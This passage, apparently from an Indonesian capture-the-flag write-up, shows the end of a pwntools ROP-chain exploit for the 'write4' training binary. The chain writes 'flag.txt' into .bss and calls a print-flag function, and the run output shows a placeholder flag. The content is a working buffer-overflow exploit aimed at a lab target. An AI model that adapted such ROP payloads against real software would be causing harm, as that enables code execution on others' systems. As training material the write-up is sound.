payload += p64(pop_r14_r15)
payload += p64(bss)
payload += b'flag.txt'
payload += p64(gadgets)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(printFlag)
r.sendline(payload)
r.interactive()
```
Jalankan maka didapatkan flag
```
$python3 sol.py
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 13422)
[*] Got EOF while reading in interactive
$  
```
[Created at: February 19, 2021]